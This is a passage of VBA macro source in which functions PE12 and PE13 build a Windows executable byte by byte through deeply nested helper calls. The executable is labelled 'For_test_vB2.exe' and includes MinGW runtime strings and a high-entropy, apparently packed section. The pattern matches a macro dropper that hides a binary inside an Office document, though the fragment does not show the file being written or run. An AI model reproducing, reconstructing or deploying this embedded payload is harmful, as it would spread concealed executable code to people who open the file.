    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 10), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), "@"), 129), "@"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 255), 255), 255), 255), 255), 255), 255), 255), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 255), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 2), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 255), 255), 255), 255), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(strPE, 0), 0), 0), 0), "@"), 0), 0), 0), 195), 191), 255), 255), 192), "?"), 0), 0), 1), 0), 0), 0), 0), 0), 0), 0), 14), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 192), 209), "@"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(strPE, 0), 0), 240), "~@"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 16), 127), "@"), 0), 0), 0), 0), 0), " "), 127), "@"), 0), 0), 0), 0), 0), 160), 127), "@"), 0), 0), 0), 0), 0), "0"), 127), "@"), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(strPE, 0), 128), "@"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 16), 128), "@"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), " "), 128), "@"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), "For_test_vB2.exe"), 0), "oRATqTIarsMt"), 0)
    strPE = A(A(B(A(A(A(A(B(A(B(A(B(A(B(A(A(B(A(B(A(A(A(B(A(A(A(B(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(strPE, 0), 0), 177), "ZQ"), 217), 207), 232), 169), "1"), 200), 223), 234), 29), "y|"), 192), "4Y"), 169), "HZ"), 204), 151), 203), "/"), 204), 192), 188), "X"), 210), "u"), 154), 29), "#a"), 29), "e"), 175), "4"), 28), "!"), 175), 247), 141), 214), "&6"), 24), 3)
    strPE = B(A(B(A(B(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(B(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(B(strPE, "^"), 148), 252), 13), 136), "B"), 143), "f"), 190), 204), "Z"), 24), 220), 162), 249), 210), "#"), 13), 136), ">"), 3), "6"), 154), 212), "Q"), 229), 166), 195), 148), 13), 150), 133), "r"), 187), 177), "v"), 219), "c("), 183), 147), 134), 10), "C"), 188), "f"), 31), "~a-")
    strPE = B(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(B(A(B(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(B(strPE, "b)De"), 9), "z"), 34), 143), "F"), 4), 186), 24), 169), "1JR"), 29), 233), "o"), 7), 203), 160), 165), 149), "K"), 135), 11), "o#"), 143), "KQ"), 18), 163), " "), 162), 134), "m"), 186), 216), 134), 25), 216), "=_"), 142), 215), 17), 243), ",")
    strPE = B(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(B(A(A(A(B(A(A(B(A(A(A(B(A(A(B(A(B(A(A(B(A(B(strPE, "0{"), 180), "H"), 216), 4), "u"), 165), "t7z}"), 149), 219), "N"), 237), 130), 175), "}"), 154), 234), "X"), 28), 240), 162), "p"), 151), "{b"), 10), "."), 233), 177), "JI"), 9), 20), 170), 218), 213), 164), 171), 11), "JX"), 138), 231), "0"), 150), "E")
    strPE = A(B(A(B(A(B(A(A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(B(A(A(A(B(A(A(B(A(B(A(B(A(B(strPE, "Pz"), 200), "x#"), 228), " "), 234), "A"), 202), 211), "#2"), 192), 186), 178), "O"), 155), 131), "HsWn"), 251), 237), 171), "Lyz"), 219), 245), 142), "3"), 152), 211), "$"), 29), 153), "O"), 211), 1), 210), "Cv?"), 17), "\"), 138), "&"), 214)
    strPE = A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(B(A(B(A(B(A(B(A(A(A(B(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(strPE, 167), "pz"), 255), 34), "l[J-"), 135), "?"), 147), 143), 133), 142), 154), 142), "_"), 34), "&"), 205), 23), 4), "VY"), 221), ":Z"), 133), "X"), 197), "hl"), 220), 162), 161), "UR"), 135), 190), 146), 9), "Z"), 222), 176), "[p"), 251), 134), 158)
    strPE = B(A(B(A(B(A(B(A(A(B(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(B(A(B(strPE, "Y"), 161), "u"), 219), 242), "J"), 131), "5"), 167), "^"), 140), 14), 226), 201), 174), 243), 177), 145), "x"), 173), 253), 18), 206), 162), "ti"), 210), 210), 139), 7), 254), 157), "a"), 167), 149), "O^"), 22), "J"), 202), 205), "d"), 247), "}"), 215), "V"), 134), "dpG")
    strPE = A(A(A(A(B(A(A(A(B(A(A(B(A(B(A(A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(A(strPE, 164), 183), 209), 4), "4"), 240), 149), 163), 157), 214), "#vb<"), 127), 213), 209), "$%l["), 253), 174), 150), "kk"), 222), 171), "T"), 9), 221), "`"), 150), 226), 220), " "), 231), "*V"), 188), 176), "'"), 219), 14), 232), "q"), 11), 17), 9), 20)
    strPE = B(A(B(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(A(B(A(B(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(A(strPE, 188), 10), "}"), 173), 194), 131), "R"), 163), 136), 11), 224), 159), 154), 196), "`"), 190), "[2,"), 190), 253), "8"), 136), 136), "C"), 137), "w"), 204), 151), "Z["), 196), "~"), 186), "g"), 232), 0), 128), "T"), 153), 187), 212), 146), 1), "@#Xh"), 221), "t")
    strPE = A(B(A(B(A(B(A(A(B(A(B(A(A(B(A(A(B(A(B(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(B(A(A(A(A(strPE, 153), 15), 154), 136), "vR"), 160), "=K"), 14), 185), "'"), 3), 163), 215), 196), "~<"), 188), 254), 188), 209), 24), "3H<'"), 225), "b"), 191), "cRP"), 216), 128), "MV"), 154), 149), "J"), 221), "w"), 244), 179), "v"), 216), "b"), 136), ","), 7)
    strPE = A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(B(strPE, "y"), 217), 183), 139), 131), 169), 231), "H"), 200), 230), "L"), 172), 0), 0), 240), 27), "@"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), "A"), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 8), 0), "A"), 0), 0), 0), 0), 0), 156), 208), "@"), 0), 0), 0), 0), 0), "@"), 240), "@"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), "Unknown error"), 0), 0), 0), "Argument domain error (D")
    strPE = B(A(B(A(A(B(strPE, "OMAIN)"), 0), 0), "Overflow range error (OVERFLOW)"), 0), "Partial lo")
    strPE = B(A(A(A(A(B(strPE, "ss of significance (PLOSS)"), 0), 0), 0), 0), "Total loss of signif")
    strPE = B(A(A(A(A(A(A(B(strPE, "icance (TLOSS)"), 0), 0), 0), 0), 0), 0), "The result is too small to be ")
    strPE = B(A(B(strPE, "represented (UNDERFLOW)"), 0), "Argument singularity (SIGN")
    strPE = A(B(A(A(A(A(A(A(A(B(strPE, ")"), 0), 0), 0), 0), 0), 0), 0), "_matherr(): %s in %s(%g, %g)  (retval=%g)"), 10)
    strPE = B(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(B(A(A(A(B(A(A(A(strPE, 0), 0), 216), "y"), 255), 255), 140), "y"), 255), 255), "$y"), 255), 255), 172), "y"), 255), 255), 188), "y"), 255), 255), 204), "y"), 255), 255), 156), "y"), 255), 255), "Mingw-w64 runtime fa")
    strPE = B(A(B(A(A(A(A(A(A(B(strPE, "ilure:"), 10), 0), 0), 0), 0), 0), "Address %p has no image-section"), 0), "  Virt")
    strPE = A(A(A(A(A(A(A(A(B(strPE, "ualQuery failed for %d bytes at address %p"), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = B(A(A(B(strPE, "  VirtualProtect failed with code 0x%x"), 0), 0), "  Unknown ")

    PE12 = strPE
End Function

Private Function PE13() As String
   Dim strPE As String

    strPE = ""
    strPE = B(A(A(A(A(A(A(A(A(B(strPE, "pseudo relocation protocol version %d."), 10), 0), 0), 0), 0), 0), 0), 0), "  Un")
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(strPE, "known pseudo relocation bit size %d."), 10), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(strPE, 0), 0), 160), "~"), 255), 255), 160), "~"), 255), 255), 160), "~"), 255), 255), 160), "~"), 255), 255), 160), "~"), 255), 255), 8), "~"), 255), 255), 160), "~"), 255), 255), 208), "~"), 255), 255), 8), "~"), 255), 255), "3~"), 255), 255), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(A(B(A(B(A(B(strPE, "(null)"), 0), "NaN"), 0), "Inf"), 0), 0), "("), 0), "n"), 0), "u"), 0), "l"), 0), "l"), 0), ")"), 0), 0), 0), 0), 0), 162), 169), 255), 255), 168), 163), 255), 255), 168), 163), 255), 255), 188), 169), 255), 255), 168), 163)
    strPE = A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 255), 255), 196), 168), 255), 255), 168), 163), 255), 255), 219), 168), 255), 255), 168), 163), 255), 255), 168), 163), 255), 255), "P"), 169), 255), 255), 140), 169), 255), 255), 168), 163), 255), 255), "W"), 167), 255), 255), "p"), 167), 255), 255), 168), 163), 255), 255), 140), 167), 255), 255)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 168), 163), 255), 255), 168), 163), 255), 255), 168), 163), 255), 255), 168), 163), 255), 255), 168), 163), 255), 255), 168), 163), 255), 255), 168), 163), 255), 255), 168), 163), 255), 255), 168), 163), 255), 255), 168), 163), 255), 255), 168), 163), 255), 255), 168), 163), 255), 255), 168), 163)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 255), 255), 168), 163), 255), 255), 168), 163), 255), 255), 168), 163), 255), 255), 172), 167), 255), 255), 168), 163), 255), 255), 228), 167), 255), 255), 168), 163), 255), 255), 28), 168), 255), 255), "T"), 168), 255), 255), 140), 168), 255), 255), 168), 163), 255), 255), 18), 166), 255), 255)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(strPE, 168), 163), 255), 255), 168), 163), 255), 255), "@"), 167), 255), 255), 168), 163), 255), 255), 168), 163), 255), 255), 168), 163), 255), 255), 168), 163), 255), 255), 168), 163), 255), 255), 168), 163), 255), 255), 217), 169), 255), 255), 168), 163), 255), 255), 168), 163), 255), 255), 168), 163)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(strPE, 255), 255), 168), 163), 255), 255), " "), 164), 255), 255), 168), 163), 255), 255), 168), 163), 255), 255), 168), 163), 255), 255), 168), 163), 255), 255), 168), 163), 255), 255), 168), 163), 255), 255), 168), 163), 255), 255), 168), 163), 255), 255), 154), 165), 255), 255), 168), 163), 255), 255)
    strPE = A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(strPE, 23), 165), 255), 255), 144), 164), 255), 255), ":"), 166), 255), 255), 208), 166), 255), 255), 8), 167), 255), 255), "r"), 166), 255), 255), 144), 164), 255), 255), "x"), 164), 255), 255), 168), 163), 255), 255), 146), 166), 255), 255), 178), 166), 255), 255), "\"), 165), 255), 255), " "), 164)
    strPE = A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 255), 255), 210), 165), 255), 255), 168), 163), 255), 255), 168), 163), 255), 255), 235), 164), 255), 255), "x"), 164), 255), 255), " "), 164), 255), 255), 168), 163), 255), 255), 168), 163), 255), 255), " "), 164), 255), 255), 168), 163), 255), 255), "x"), 164), 255), 255), 0), 0), 0), 0)
    strPE = A(A(B(A(B(A(B(A(B(A(B(A(A(B(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(B(strPE, "Infinity"), 0), "NaN"), 0), "0"), 0), 0), 0), 0), 0), 0), 0), 0), 248), "?aCoc"), 167), 135), 210), "?"), 179), 200), "`"), 139), "("), 138), 198), "?"), 251), "y"), 159), "P"), 19), "D"), 211), "?"), 4), 250)
    strPE = A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(A(B(strPE, "}"), 157), 22), "-"), 148), "<2ZGU"), 19), "D"), 211), "?"), 0), 0), 0), 0), 0), 0), 240), "?"), 0), 0), 0), 0), 0), 0), "$@"), 0), 0), 0), 0), 0), 0), 8), "@"), 0), 0), 0), 0), 0), 0), 28), "@"), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(strPE, 0), 0), 20), "@"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 128), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 224), "?"), 0), 0), 0), 0), 0), 0), 0), 0), 5), 0), 0), 0), 25), 0)
    strPE = B(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(strPE, 0), 0), "}"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 240), "?"), 0), 0), 0), 0), 0), 0), "$@"), 0), 0), 0), 0), 0), 0), "Y@")
    strPE = A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), "@"), 143), "@"), 0), 0), 0), 0), 0), 136), 195), "@"), 0), 0), 0), 0), 0), "j"), 248), "@"), 0), 0), 0), 0), 128), 132), ".A"), 0), 0), 0), 0), 208), 18), "cA"), 0), 0), 0), 0), 132), 215), 151), "A"), 0), 0)
    strPE = B(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(B(A(A(B(A(A(strPE, 0), 0), "e"), 205), 205), "A"), 0), 0), 0), " _"), 160), 2), "B"), 0), 0), 0), 232), "vH7B"), 0), 0), 0), 162), 148), 26), "mB"), 0), 0), "@"), 229), 156), "0"), 162), "B"), 0), 0), 144), 30), 196), 188), 214), "B"), 0), 0), "4&")
    strPE = A(A(A(A(A(B(A(A(A(B(A(A(B(A(B(A(B(A(B(A(B(A(A(B(A(A(B(A(A(A(A(B(A(B(A(A(A(B(A(B(A(strPE, 245), "k"), 12), "C"), 0), 128), 224), "7y"), 195), "AC"), 0), 160), 216), 133), "W4vC"), 0), 200), "Ngm"), 193), 171), "C"), 0), "="), 145), "`"), 228), "X"), 225), "C@"), 140), 181), "x"), 29), 175), 21), "DP"), 239), 226), 214), 228), 26)
    strPE = B(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(B(strPE, "KD"), 146), 213), "M"), 6), 207), 240), 128), "D"), 0), 0), 0), 0), 0), 0), 0), 0), 188), 137), 216), 151), 178), 210), 156), "<3"), 167), 168), 213), "#"), 246), "I9="), 167), 244), "D"), 253), 15), 165), "2"), 157), 151), 140), 207), 8), 186), "[%")
    strPE = A(A(B(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(strPE, "Co"), 172), "d("), 6), 200), 10), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 128), 224), "7y"), 195), "AC"), 23), "n"), 5), 181), 181), 184), 147), "F"), 245), 249)
    strPE = A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(B(A(B(A(B(A(A(B(strPE, "?"), 233), 3), "O8M2"), 29), "0"), 249), "Hw"), 130), "Z<"), 191), "s"), 127), 221), "O"), 21), "u"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), "@"), 144), "@"), 0)
    strPE = A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), "P"), 144), "@"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), " "), 129), "@"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 160), 175), "@"), 0), 0), 0)
    strPE = A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 160), 175), "@"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), " "), 162), "@"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), "@"), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 227), "@"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), "("), 227), "@"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), "@"), 227), "@"), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), "P"), 227), "@"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 240), 208), "@"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), "P"), 208), "@"), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(strPE, 0), 0), 0), 0), "X"), 208), "@"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), "@"), 167), "@"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 240), "@"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(strPE, 0), 0), 16), 240), "@"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 24), 240), "@"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), "0"), 240), "@"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(strPE, 160), 208), "@"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), "`"), 208), "@"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 224), 208), "@"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), "p"), 34)
    strPE = A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(strPE, "@"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 144), 28), "@"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 128), 208), "@"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 176), 208), "@"), 0)
    strPE = A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), "p"), 208), "@"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 152), 208), "@"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 148), 208), "@"), 0), 0), 0)
    strPE = B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 144), 208), "@"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), "GCC: (GNU) 10-win32 2020")
    strPE = B(A(A(A(A(B(A(A(A(A(B(strPE, "0525"), 0), 0), 0), 0), "GCC: (GNU) 10-win32 20210110"), 0), 0), 0), 0), "GCC: (GNU)")
